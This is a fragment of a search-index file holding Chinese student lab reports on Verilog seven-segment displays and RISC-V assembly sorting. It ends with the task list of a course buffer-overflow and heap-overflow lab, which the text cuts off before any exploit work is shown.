\u9876\u5c42\u6a21\u5757\u4e2d\u589e\u52a0 SW \u8f93\u5165\uff1a <pre><code>module Top(\n    input sys_clk,\n    input rstn,\n    input [3:0] SW,  // \u56db\u4e2a\u5f00\u5173\n    output [7:0]  num_csn,\n    output [7:0]  num_an\n);\n</code></pre> \u7136\u540e\u5728 xdc \u7ea6\u675f\u6587\u4ef6\u4e2d\u52a0\u5165\uff1a <pre><code>set_property PACKAGE_PIN R15 [get_ports {SW[3]}]\nset_property IOSTANDARD LVCMOS33 [get_ports {SW[3]}]\nset_property PACKAGE_PIN M13 [get_ports {SW[2]}]\nset_property IOSTANDARD LVCMOS33 [get_ports {SW[2]}]\nset_property PACKAGE_PIN L16 [get_ports {SW[1]}]\nset_property IOSTANDARD LVCMOS33 [get_ports {SW[1]}]\nset_property PACKAGE_PIN J15 [get_ports {SW[0]}]\nset_property IOSTANDARD LVCMOS33 [get_ports {SW[0]}]\n</code></pre> \u5373\u4ece\u5de6\u5230\u53f3 R15,M13,L16,J15 \u4f9d\u6b21\u5bf9\u5e94 SW \u7684\u4ece\u9ad8\u5230\u4f4e\u4f4d</p>"},{"location":"cs/system/cs1/lab3/#_5","title":"\u53d6\u6d88\u95ea\u70c1","text":""},{"location":"cs/system/cs1/lab3/#_6","title":"\u601d\u8def\u53ca\u4ee3\u7801","text":"<p>counter.v \u4e2d\u662f\u65f6\u949f\u63a7\u5236\u903b\u8f91\uff1a <pre><code>module counter(\n    input  wire clk,        // clock\n    input  wire rstn,       // RESET Low Enable\n    output reg [31:0] clkn  // clock number [32 bits]\n);\n\nalways @ (posedge clk) begin\n    if (rstn)\n        clkn &lt;= clkn + 1;   // clkn ++\n    else\n        clkn &lt;= 0;          // clkn reset\nend\n\nendmodule\n</code></pre> \u5373\u6bcf\u4e00\u4e2a clk \u65f6\u949f\u4e0a\u5347\u6cbf\u589e\u52a0\u4e00\u6b21 clkn\u3002\u7136\u540e\u5728 Top.v \u4e2d\u6709\u63a7\u5236\u5237\u65b0\u7684\u90e8\u5206\u903b\u8f91\uff1a <pre><code>assign flash_clk = clkn[25];\n\nalways @(posedge flash_clk) begin\n    // data_src &lt;= ...\nend\n</code></pre> \u4e5f\u5c31\u662f\u5f53 clkn \u7684\u7b2c 25 \u4f4d\u4ece 0 \u53d8\u4e3a 1 \u65f6\uff08\u5373 flash_clk \u4e0a\u5347\u6cbf\uff09\u6267\u884c\u5bf9\u4e8e data_src \u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u5237\u65b0\u3002\u6240\u4ee5\u53d6\u6d88\u95ea\u70c1\u53ea\u8981\u4f7f\u5237\u65b0\u901f\u5ea6\u52a0\u5feb\u5230\u4eba\u773c\u96be\u4ee5\u5206\u8fa8\u3002\u4e5f\u5c31\u662f\u8ba9 flash_clk \u8bb0\u5f55 clkn \u66f4\u4f4e\u4f4d\u7684\u6bd4\u7279\uff1a <pre><code>assign flash_clk = clkn[15];\n</code></pre></p>"},{"location":"cs/system/cs1/lab3/#_7","title":"\u4e03\u6bb5\u7ba1\u7684\u8bd1\u7801\u5668","text":"<p>\u4ece\u63d0\u4f9b\u7684\u6587\u4ef6\u4e2d\u53ef\u4ee5\u770b\u51fa\u9700\u8981\u5b9e\u73b0\u7684\u662f hex2shape.v \u4e2d\u7684 hex_to_shape \u6a21\u5757\uff0c\u4ee5\u53ca Top.v \u4e2d\u5c06\u5f00\u5173\u8f93\u5165\u4e0e data_src \u76f8\u8fde\u63a5</p>"},{"location":"cs/system/cs1/lab3/#hex_to_shape","title":"hex_to_shape","text":""},{"location":"cs/system/cs1/lab3/#_8","title":"\u601d\u8def","text":"<p><pre><code>module hex_to_shape(\n    input   [3:0] hex,\n    output  [7:0] shape\n);\n</code></pre> \u53ea\u9700\u8981\u5b9e\u73b0\u6839\u636e hex \u6765\u5bf9 shape \u8fdb\u884c\u8d4b\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f shape \u7684\u987a\u5e8f\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u4f9d\u6b21\u8868\u793a\u4e03\u6bb5\u7ba1\u7684 A~G \u4ee5\u53ca\u5c0f\u6570\u70b9 DP\uff1a</p> <p>\u5e76\u4e14\u7531\u4e8e\u4e03\u6bb5\u7ba1\u662f\u4f4e\u7535\u5e73\u9a71\u52a8\uff0c\u6240\u4ee5\u5404\u4e2a\u4f4d\u7f6e\u4e0a 0 \u8868\u793a\u70b9\u4eae\uff0c1 \u8868\u793a\u7184\u706d</p>"},{"location":"cs/system/cs1/lab3/#_9","title":"\u4ee3\u7801","text":"<p>\u6839\u636e\u5404\u4e2a\u663e\u793a\u7684\u6570\u5b57\u5b57\u6bcd\u7684\u5f62\u72b6\u6765\u5199\u51fa shape\uff0c\u8fd9\u91cc\u76f4\u63a5\u987a\u52bf\u5b8c\u6210\u4e86\u5bf9\u4e8e A~F \u7684\u652f\u6301 <pre><code>module hex_to_shape(\n    input   [3:0] hex,\n    output  [7:0] shape\n);\n\nreg [7:0] shape_reg;       // \u9700\u8981\u4e00\u4e2a register \u6765\u5728 case \u8bed\u53e5\u4e2d\u8d4b\u503c\nassign shape = shape_reg; \n\nalways @(*) begin \n    case (hex)    // case \u5404\u79cd hex \u60c5\u51b5\n        4'h0: begin shape_reg &lt;= 8'b11000000; end\n        4'h1: begin shape_reg &lt;= 8'b11111001; end\n        4'h2: begin shape_reg &lt;= 8'b10100100; end\n        4'h3: begin shape_reg &lt;= 8'b10110000; end\n        4'h4: begin shape_reg &lt;= 8'b10011001; end\n        4'h5: begin shape_reg &lt;= 8'b10010010; end\n        4'h6: begin shape_reg &lt;= 8'b10000010; end\n        4'h7: begin shape_reg &lt;= 8'b11111000; end\n        4'h8: begin shape_reg &lt;= 8'b10000000; end\n        4'h9: begin shape_reg &lt;= 8'b10010000; end\n        4'hA: begin shape_reg &lt;= 8'b10001000; end\n        4'hB: begin shape_reg &lt;= 8'b10000011; end\n        4'hC: begin shape_reg &lt;= 8'b11000110; end\n        4'hD: begin shape_reg &lt;= 8'b10100001; end\n        4'hE: begin shape_reg &lt;= 8'b10000110; end\n        4'hF: begin shape_reg &lt;= 8'b10001110; end\n        default: begin shape_reg &lt;= 8'b11111111; end \n        // \u867d\u7136\u4e0d\u4f1a\u89e6\u53d1\uff0c\u4f46\u8fd8\u662f\u5199\u4e86\u4e00\u4e2a\u4e0d\u663e\u793a\u7684 default\n    endcase\nend\n\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab3/#data_src","title":"\u5173\u8054\u5f00\u5173\u8f93\u5165\u4e0e data_src","text":""},{"location":"cs/system/cs1/lab3/#_10","title":"\u601d\u8def","text":"<p>\u7ed9\u51fa\u7684\u793a\u4f8b\u90e8\u5206\u662f\uff1a <pre><code>always @(posedge flash_clk) begin\n    // 32'h00000000 &lt;-&gt; 32'hffffffff\n    if (rstn) data_src &lt;= ~data_src;\n    else data_src &lt;= 0;\nend\n</code></pre> \u4e5f\u5c31\u662f\u5f53 rstn \u4e3a 1 \u7684\u65f6\u5019\uff0cdata_src \u88ab\u8d4b\u503c\u4e3a 32'hffffffff\uff0c\u6240\u4ee5\u8fd9\u4e2a\u91cc\u9762\u662f\u8981\u8fdb\u884c\u8d4b\u503c\u64cd\u4f5c\u7684\u4f4d\u7f6e\uff0c\u800c\u4e0b\u9762\u7684 else \u5219\u662f\u590d\u4f4d\u65f6\u8fdb\u884c\u7684\u8d4b\u503c\u64cd\u4f5c</p>"},{"location":"cs/system/cs1/lab3/#_11","title":"\u4ee3\u7801","text":"<p>\u6211\u8fd9\u91cc\u5c06\u516b\u4e2a\u4e03\u6bb5\u7ba1\u663e\u793a\u4e3a\u540c\u6837\u7684\u5b57\u7b26\uff0c\u90fd\u7531 SW \u63a7\u5236\uff1a <pre><code>always @(posedge flash_clk) begin\n    if (rstn) begin\n        data_src[31:28] &lt;= SW[3:0];\n        data_src[27:24] &lt;= SW[3:0];\n        data_src[23:20] &lt;= SW[3:0];\n        data_src[19:16] &lt;= SW[3:0];\n        data_src[15:12] &lt;= SW[3:0];\n        data_src[11: 8] &lt;= SW[3:0];\n        data_src[ 7: 4] &lt;= SW[3:0];\n        data_src[ 3: 0] &lt;= SW[3:0];\n    end\n    else data_src &lt;= 0;\nend\n</code></pre></p>"},{"location":"cs/system/cs1/lab3/#_12","title":"\u4e0a\u677f\u6d4b\u8bd5","text":"<p>\u8fdb\u884c\u6240\u6709\u4fee\u6539\u540e\u8fdb\u884c\u4e86\u4e0a\u677f\u9a8c\u8bc1\uff0c\u5747\u6309\u7167\u9884\u671f\u663e\u793a\uff0c\u4e00\u5207\u6b63\u5e38\u3002</p>"},{"location":"cs/system/cs1/lab4-1/","title":"RISC-V \u6c47\u7f16\u5b9e\u9a8c","text":"<p> \u7ea6 779 \u4e2a\u5b57  129 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab4-1 \u5b9e\u9a8c\u62a5\u544a\uff082022.04.30 ~ 2022.05.13\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab4-1/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u5b9e\u9a8c 1<ol> <li>\u8f93\u5165\u6837\u4f8b\u6c47\u7f16\uff0c\u8fd0\u884c\u6c47\u7f16</li> <li>\u5355\u6b65\u8c03\u8bd5\uff0c\u7ed9\u51fa\u6bcf\u6b21 x1 \u6570\u503c\u53d8\u5316\u7684\u622a\u56fe</li> <li>\u56de\u7b54 x7 \u6700\u7ec8\u7684\u6570\u503c</li> </ol> </li> <li>\u5b9e\u9a8c 2<ol> <li>\u4eff\u7167\u6837\u4f8b\u7a0b\u5e8f\uff0c\u5c06\u5b66\u53f7 10 \u4e2a\u6570\u5b57\u4f9d\u6b21\u5199\u5230 memory \u5730\u5740 0x00040000 ~ 0x00040020 \u4f4d\u7f6e\u5904</li> <li>\u5355\u6b65\u6267\u884c\uff0c\u5bf9\u5199\u5165\u5b66\u53f7\u90e8\u5206\u7684\u6548\u679c\u622a\u56fe</li> <li>\u7f16\u5199\u6c47\u7f16\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5192\u6ce1\u6392\u5e8f\u7b97\u6cd5\u3002\u8981\u6c42\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\uff0c10 \u4f4d\u5b66\u53f7\u7684\u6570\u5b57\u4ece\u5927\u5230\u5c0f\u6392\u5e8f</li> <li>\u5355\u6b65\u6267\u884c\u7a0b\u5e8f\uff0c\u5bf9\u6bcf\u4e00\u8f6e\u626b\u63cf\u5b8c\u6210\u540e\u7684\u7ed3\u679c\u8fdb\u884c\u622a\u56fe</li> <li>\u7ed9\u51fa\u6c47\u7f16\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\uff0c\u5e76\u7ed3\u5408\u4ee3\u7801\uff0c\u91cd\u70b9\u8bf4\u660e\u4e24\u5c42\u5faa\u73af\u7684\u5b9e\u73b0\u8fc7\u7a0b</li> </ol> </li> <li>Bonus<ol> <li>\u4fee\u6539\u4e0a\u8ff0\u7a0b\u5e8f\uff0c\u4f7f\u5f97\u4ea4\u6362 memory \u4e2d\u4e24\u4e2a\u6570\u7684\u4f4d\u7f6e\u7684\u8fc7\u7a0b swap \u4ee5\u51fd\u6570\u8c03\u7528\u7684\u5f62\u5f0f\u5b8c\u6210</li> </ol> </li> </ul>"},{"location":"cs/system/cs1/lab4-1/#1","title":"\u5b9e\u9a8c 1","text":""},{"location":"cs/system/cs1/lab4-1/#_2","title":"\u6c47\u7f16\u4ee3\u7801","text":"<p><pre><code># riscv\ninitial:\n    lui x6, 0x666\n    addi x1, x0, 2\n    addi x2, x1, 14\n    sw x1, 8(x2)\nl1:\n    ori x3, x1, 4\n    slli x1, x1, 4\n    lw x4, -8(x1)\n    srai x1, x1, 1\n    beq x1, x2, l2\n    addi x6, x6, -1\nl2:\n    addi x1, x0, 2\n    bne x4, x1, l1\nexit:\n    add x7, x2, x2\n</code></pre> \u4e00\u4e9b\u6307\u4ee4\uff1a</p> <ul> <li>lui x6 0x666\uff1a\u5c06 0x666 \u5b58\u81f3 x6 \u9ad8 20 \u4f4d</li> <li>addi x1, x0, 2\uff1a\u5c06 x0\uff080\uff09 \u52a0\u7acb\u5373\u6570 2 \u5b58\u81f3 x1</li> <li>sw x1 8(x2)\uff1a\u5c06 x1 \u5b58\u81f3 memory \u4e2d\u5730\u5740 x2 + 8 \u7684\u4f4d\u7f6e</li> <li>ori x3, x1, 4\uff1a\u5c06 x1 \u4e0e\u7acb\u5373\u6570\u6309\u4f4d\u6216\uff0c\u5b58\u81f3 x3 \u4e2d</li> <li>slli x1, x1, 4\uff1a\u5c06 x1 \u903b\u8f91\u5de6\u79fb\u56db\u4f4d\u5b58\u5165 x1 \u4e2d</li> <li>lw x4, -8(x1)\uff1a\u5c06 memory \u4e2d\u5730\u5740 x1 - 8 \u4f4d\u7f6e\u7684\u503c\u8bfb\u5230 x4 \u4e2d </li> <li>srai x1, x1, 1\uff1a\u5c06 x1 \u903b\u8f91\u53f3\u79fb 1 \u4f4d\u5b58\u5165 x1 \u4e2d</li> <li>beq x1, x2, l2\uff1a\u82e5 x1 == x2 \u5219\u8df3\u5230\u6807\u53f7 l2 \u5904</li> <li>bne x4, x1, l1\uff1a\u82e5 x4 != x1 \u5219\u8df3\u5230\u6807\u53f7 l1 \u5904</li> </ul>"},{"location":"cs/system/cs1/lab4-1/#x1","title":"x1 \u53d8\u5316\u622a\u56fe","text":"<p>\u5c06\u5355\u6b65\u8fd0\u884c\u65f6 x1 \u5bc4\u5b58\u5668\u7684\u503c\u62fc\u63a5\u4e86\u8d77\u6765 </p> <p>x7 \u6700\u7ec8\u503c\u4e3a 32</p>"},{"location":"cs/system/cs1/lab4-1/#2","title":"\u5b9e\u9a8c 2","text":""},{"location":"cs/system/cs1/lab4-1/#_3","title":"\u5199\u5165\u5b66\u53f7","text":"<p>\u4eff\u7167\u6837\u4f8b <pre><code>    addi x5, x0, 3\n    addi x6, x0, 0\n    lui  x6, 0x40\n    sw   x5, 0(x6)\n    addi x5, x0, 2\n    sw   x5, 4(x6)\n    addi x5, x0, 1\n    sw   x5, 8(x6)\n    addi x5, x0, 1\n    ...\n</code></pre></p>"},{"location":"cs/system/cs1/lab4-1/#_4","title":"\u5192\u6ce1\u6392\u5e8f","text":"<p><pre><code># \u63a5\u4e0a\u9762\u4ee3\u7801\n    addi x5, x0, 40  # len\n    addi t3, x0, 0   # i\nfor1:\n    addi t4, x0, 0   # j\nfor2:\n    add  x7, x6, t4\n    lw   t5, 0(x7)\n    lw   t6, 4(x7)\n    bge  t5, t6, for2_end\n    sw   t5, 4(x7)\n    sw   t6, 0(x7)\nfor2_end:\n    addi t4, t4, 4\n    addi t6, x0, 4\n    sub  t5, x5, t6\n    sub  t5, t5, t3\n    blt  t4, t5, for2\nfor1_end:\n    addi t3, t3, 4\n    addi t6, x0, 4\n    sub  t5, x5, t6\n    blt  t3, t5, for1\n</code></pre> \u5148\u5c06\u957f\u5ea6 10 \u4e58 4 \u5b58\u5165 x5 \u4e2d\uff0c\u7136\u540e\u4e3a t3\uff08\u8868\u793a\u5916\u5c42\u5faa\u73af\u5faa\u73af\u53d8\u91cf\uff09\u8d4b\u521d\u503c 0\uff0c\u4e00\u4e2a\u6807\u53f7\u6807\u8bb0\u540e\u9762\u662f\u5916\u5c42\u5faa\u73af\uff0c\u5faa\u73af\u4e2d\u4e3a t3\uff08\u5185\u5c42\u5faa\u73af\u53d8\u91cf\uff09\u8d4b\u521d\u503c 0\uff0c\u518d\u4e00\u4e2a\u6807\u53f7\u6807\u8bb0\u540e\u9762\u662f\u5185\u5c42\u5faa\u73af\u3002\u5185\u5c42\u5faa\u73af\u4e2d\u5148\u5c06 x6\uff08\u5b58\u503c\u7684 memory \u8d77\u59cb\u5730\u5740\uff09\u52a0\u4e0a j\uff0c\u7136\u540e\u5206\u522b\u8bfb\u53d6\u504f\u79fb\u4e3a 0 \u548c 4 \u7684\u5185\u5bb9\u5230 t5\uff08a[j]\uff09\u3001t6\uff08a[j+1]\uff09\uff0c\u6bd4\u8f83\uff0c\u5982\u679c t5 \u5927\u4e8e\u7b49\u4e8e t6 \u5219\u4e0d\u8fdb\u884c\u4ea4\u6362\u64cd\u4f5c\uff0c\u76f4\u63a5\u8df3\u5230 for2_end\uff0c\u5426\u5219\u4ea4\u6362\u5b58\u5230\u53e6\u4e00\u65b9\u7684\u4f4d\u7f6e\u4e2d\u3002for2_end \u4e2d\u5904\u7406\u5faa\u73af\u53d8\u91cf\u5e76\u4e14\u5224\u65ad\uff0c\u6bcf\u6b21\u4e3a t4 \u52a0 4\uff0c\u7136\u540e\u8ba1\u7b97\u4e00\u4e0b x5 - t3 - 4\uff08len-i-1\uff09\uff0c\u5224\u65ad t4 \u548c\u5b83\u7684\u5927\u5c0f\uff0c\u5982\u679c\u5c0f\u4e8e\u5219\u8fd4\u56de for2_end \u7ee7\u7eed\u5185\u5c42\u5faa\u73af\uff0c\u5426\u5219\u987a\u6b21\u8fdb\u5165 for1_end \u4e2d\uff0c\u540e\u9762\u4e3a t3 \u52a0 4\uff0c\u5224\u65ad\u5176\u548c x5-4\uff08len-1\uff09\u7684\u5927\u5c0f\u5173\u7cfb\uff0c\u5982\u679c\u5c0f\u4e8e\u5219\u8fd4\u56de for1 \u4e2d\u7ee7\u7eed\u5916\u5c42\u5faa\u73af\uff0c\u5426\u5219\u76f4\u63a5\u7ed3\u675f\u7a0b\u5e8f</p>"},{"location":"cs/system/cs1/lab4-1/#_5","title":"\u6bcf\u8f6e\u5192\u6ce1\u7684\u7ed3\u679c","text":"<p>\uff08\u9690\u79c1\u95ee\u9898\uff0c\u4e0d\u5c55\u793a\uff09</p> <p>\u6700\u540e\u4e00\u6b21\u5c31\u662f\u6392\u597d\u5e8f\u540e\u7684\u7ed3\u679c</p>"},{"location":"cs/system/cs1/lab4-1/#bonus","title":"Bonus","text":"<p>\u7531\u4e8e\u63d0\u4f9b\u7684 interpreter \u4e0d\u652f\u6301\u4e00\u822c\u7684\u51fd\u6570\u64cd\u4f5c\uff0c\u6240\u4ee5\u4f7f\u7528 sp \u6307\u9488\u6a21\u62df\u6808\u3001jal \u6307\u9488\u624b\u52a8\u8df3\u8f6c\u6765\u6a21\u62df\u51fd\u6570\u884c\u4e3a</p> <p>swap \u51fd\u6570\uff08\u4ece\u6808\u4e0a\u53d6\u4e24\u4e2a\u6570\uff0c\u4ea4\u6362\u518d\u653e\u56de\u53bb\uff09\uff1a <pre><code>swap:\n    addi sp, sp, -4\n    lw   a0, 0(sp)\n    addi sp, sp, -4\n    lw   a1, 0(sp)\n    add  a2, x0, a1\n    add  a1, x0, a0\n    add  a0, x0, a2\n    sw   a1, 0(sp)\n    addi sp, sp, 4\n    sw   a0, 0(sp)\n    addi sp, sp, 4\n    jal  x0, swap_exit\n</code></pre></p> <p>\u5b8c\u6574\u4ee3\u7801\uff1a <pre><code>    addi x5, x0, 3\n    addi x6, x0, 0\n    lui  x6, 0x40\n    sw   x5, 0(x6)\n    addi x5, x0, 2\n    sw   x5, 4(x6)\n    addi x5, x0, 1\n    sw   x5, 8(x6)\n    addi x5, x0, 1\n    sw   x5, 0x10(x6)\n    ...\n\n    addi sp, x0, 0\n    lui  sp, 0x80\n    addi x5, x0, 40  # len\n    addi t3, x0, 0   # i\nfor1:\n    addi t4, x0, 0   # j\nfor2:\n    add  x7, x6, t4\n    lw   t5, 0(x7)\n    lw   t6, 4(x7)\n    bge  t5, t6, for2_end\n    sw   t5, 0(sp)\n    addi sp, sp, 4\n    sw   t6, 0(sp)\n    addi sp, sp, 4\n    jal  x0, swap\n\nswap_exit:\n    addi sp, sp, -4\n    lw   t6, 0(sp)\n    addi sp, sp, -4\n    lw   t5, 0(sp)\n    sw   t5, 0(x7)\n    sw   t6, 4(x7)\nfor2_end:\n    addi t4, t4, 4\n    addi t6, x0, 4\n    sub  t5, x5, t6\n    sub  t5, t5, t3\n    blt  t4, t5, for2\nfor1_end:\n    addi t3, t3, 4\n    addi t6, x0, 4\n    sub  t5, x5, t6\n    blt  t3, t5, for1\n    jal  x0, exit\n\nswap:\n    addi sp, sp, -4\n    lw   a0, 0(sp)\n    addi sp, sp, -4\n    lw   a1, 0(sp)\n    add  a2, x0, a1\n    add  a1, x0, a0\n    add  a0, x0, a2\n    sw   a1, 0(sp)\n    addi sp, sp, 4\n    sw   a0, 0(sp)\n    addi sp, sp, 4\n    jal  x0, swap_exit\n\nexit:\n    addi x0, x0, 0\n</code></pre></p> <p>\u7ecf\u5355\u6b65\u8fd0\u884c\u6d4b\u8bd5\uff0c\u7ed3\u679c\u4e0e\u539f\u6765\u4e00\u81f4\u3002</p>"},{"location":"cs/system/cs1/lab4-2/","title":"overflow \u7406\u89e3","text":"<p> \u7ea6 3019 \u4e2a\u5b57  114 \u884c\u4ee3\u7801  7 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab4-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.06 ~ 2022.05.27\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab4-2/#_1","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u7406\u89e3 ELF \u6587\u4ef6\u548c\u6c47\u7f16\u6587\u4ef6<ol> <li>riscv32-unknown-linux-gnu-objdump -d key\uff0c\u6765\u5c1d\u8bd5\u7406\u89e3\u5728\u7f16\u8bd1\u5668\u5c42\u9762\uff0c\u5404\u4e2a\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u5206\u5e03</li> <li>\u5c1d\u8bd5\u8fd0\u884c RISCV \u7684 ELF \u6587\u4ef6\uff0c\u4f7f\u7528 qemu \u6765\u8fd0\u884c key</li> <li>\u8f93\u5165\u5b66\u53f7\u548c key</li> <li>\u9605\u8bfb\u6c47\u7f16 key.s \u6587\u4ef6\uff0c\u5c1d\u8bd5\u7834\u89e3\u81ea\u5df1\u5b66\u53f7\u5bf9\u5e94\u7684 key</li> </ol> </li> <li>Buffer Overflow<ol> <li>\u6211\u4eec\u7ed9\u4e86\u88ab\u653b\u51fb\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801 bof.c\uff0c\u8bf7\u5728\u7406\u89e3 bof.c \u7a0b\u5e8f\u884c\u4e3a\u7684\u57fa\u7840\u4e0a\uff0c\u5b8c\u6210\u4e00\u6b21\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u3002\u9996\u5148\u4f7f\u7528\u7f16\u8bd1\u751f\u6210 ELF \u7136\u540e\u6267\u884c bof\u3002\u9996\u5148\u8f93\u5165\u4f60\u7684\u5b66\u53f7\uff0c\u4e4b\u540e\u51fa\u73b0\u63d0\u793a Tell me something to overflow me:\uff0c\u5728\u8fd9\u4e0b\u9762\u8f93\u5165\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u653b\u51fb\u5931\u8d25\uff0c\u663e\u793a you can\u2018t hack me,please try again!</li> <li>\u5982\u679c\u653b\u51fb\u6210\u529f\uff0c\u5219\u7a0b\u5e8f\u663e\u793a\u6ea2\u51fa\u6210\u529f\uff0c\u7a0b\u5e8f\u6b63\u5e38\u7ed3\u675f\u3002\u8bf7\u5728\u8ba4\u771f\u5206\u6790\u6240\u7ed9\u6c47\u7f16\u4ee3\u7801\u548c\u6e90\u4ee3\u7801\u7684\u57fa\u7840\u4e0a\uff0c\u6784\u9020\u4e00\u4e2a\u5408\u9002\u7684\u5b57\u7b26\u4e32\uff0c\u5b8c\u6210\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\uff0c\u5e76\u8bf7\u52a1\u5fc5\u8be6\u7ec6\u8bf4\u660e\u4f60\u7684\u5206\u6790\u8fc7\u7a0b\u4ee5\u53ca\u4f9d\u636e\u3002\u63d0\u793a\uff1a\u91cd\u70b9\u5206\u6790 Hear \u51fd\u6570\u5373\u53ef\u3002</li> <li>\u4f46\u5b9e\u9645\u4e0a\u8fd8\u9700\u8981\u8003\u8651\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u867d\u7136\u663e\u793a\u653b\u51fb\u6210\u529f\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u6bb5\u9519\u8bef\uff0c\u8bf7\u63a2\u7d22\u8fd9\u79cd\u60c5\u51b5\u51fa\u73b0\u7684\u6761\u4ef6\uff0c\u5e76\u7ed9\u51fa\u8be6\u7ec6\u7684\u5206\u6790\u8bf4\u660e\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u79cd\u72b6\u51b5\u3002</li> </ol> </li> <li>Bonus: Heap Overflow<ol> <li>\u6211\u4eec\u7ed9\u51fa\u4e86 bonus \u7684 ELF\uff0c\u8fd9\u662f\u4e00\u4e2a\u5b58\u5728 heap overflow \u6f0f\u6d1e\u7684\u7a0b\u5e8f\u3002</li> <li>\u8bf7\u627e\u51fa ELF \u4e2d\u7684\u6f0f\u6d1e\u3002\u53ef\u4ee5\u5229\u7528 riscv32-unknown-linux-gnu-objdump \u67e5\u770b ELF \u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u5e76\u8fdb\u884c\u9006\u5411\uff0c\u6216\u4f7f\u7528 QEMU+GDB \u6216 SPIKE \u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\u3002</li> <li>\u6211\u4eec\u63d0\u4f9b\u7684 ELF \u4f1a\u8ba9\u4f60\u8f93\u5165\u4e24\u884c\u6570\u636e\u3002\u5176\u4e2d\u7b2c\u4e00\u884c\u6570\u636e\u5fc5\u987b\u662f\u4f60\u7684\u5b66\u53f7\uff1b\u800c\u7b2c\u4e8c\u884c\u6570\u636e\u662f\u8fdb\u884c overflow \u7684 payload\u3002</li> <li>\u6211\u4eec\u5e0c\u671b\u4f60\u80fd\u5c06 ELF \u7684\u63a7\u5236\u6d41\u52ab\u6301\u5230 target_xxx \u7684\u51fd\u6570\uff0c\u5176\u4e2d xxx \u4e3a\u4f60\u7684\u5b66\u53f7\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f60\u9700\u8981\u901a\u8fc7\u8f93\u5165\u7279\u5b9a\u7684 payload \u6765\uff0c\u6765\u8ba9 ELF \u6267\u884c\u5176\u672c\u4e0d\u5e94\u8be5\u6267\u884c\u7684\u51fd\u6570\u3002\u5982\u679c\u4f60\u5b8c\u6210\u4e86\u8fd9\u4e00\u6b65\uff0c\u4f60\u5c06\u770b\u5230 ELF \u8f93\u51fa\u63d0\u793a\u201dCongratulation xxx! You successfully perform a heap overflow attack!\u201d\u3002\u4f46\u4f60\u6b64\u65f6\u53ef\u80fd\u4f1a\u53d1\u73b0\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u9000\u51fa\uff0c\u4f1a\u62a5segment fault \u6216\u662f\u5176\u4ed6\u9519\u8bef\u3002\u5982\u679c\u62a5\u9519\u4e86\uff0c\u8bf7\u601d\u8003\u5e76\u89e3\u91ca\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u4e9b\u9519\u8bef\u3002</li> <li>\u6700\u540e\uff0c\u5982\u679c\u5b8c\u6210\u4e0a\u4e00\u6b65\u540e\uff0c\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u9000\u51fa\uff08\u5373\u6709\u62a5\u9519\uff09\uff0c\u8bf7\u4fee\u6539\u4f60\u7684 payload\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6ca1\u6709\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\u6b63\u5e38\u9000\u51fa\u3002</li> </ol> </li> </ul>"},{"location":"cs/system/cs1/lab4-2/#elf","title":"\u7406\u89e3 ELF \u6587\u4ef6\u548c\u6c47\u7f16\u6587\u4ef6","text":"<p>\u4ee3\u7801\u6bb5 .text \u5b58\u50a8\u4e86 riscv \u5b57\u8282\u7801\uff0c\u53ea\u8bfb\u6570\u636e\u6bb5 .rodata \u5728 .text \u540e\uff0c\u5b58\u50a8\u4e86\u53ea\u8bfb\u7684\u6570\u636e\uff08\u6bd4\u5982\u5b57\u7b26\u4e32\uff09\uff0c\u901a\u8fc7 riscv32-unknow-linux-gnu-objdump -d key \u53ef\u4ee5\u53cd\u7f16\u8bd1\u51fa plt \u8868\u548c .text \u6bb5\uff0c\u901a\u8fc7 ...-objdump -j .rodata -d key \u53ef\u4ee5\u8f93\u51fa .rodata \u6bb5\uff0c\u901a\u8fc7\u5c06\u5176\u5185\u5bb9\u7684\u5341\u516d\u8fdb\u5236\u503c\u8f6c\u4e3a ascii \u5b57\u7b26\u53ef\u4ee5\u5f97\u5230\u5b57\u7b26\u4e32\u5e38\u91cf\u7684\u5185\u5bb9\u548c\u5bf9\u5e94\u5730\u5740</p>"},{"location":"cs/system/cs1/lab4-2/#key","title":"\u7834\u89e3 key","text":"<p>\u9996\u5148\u53cd\u7f16\u8bd1\u51fa .text \u6bb5\uff0c\u53d1\u73b0\u5176\u4e2d main 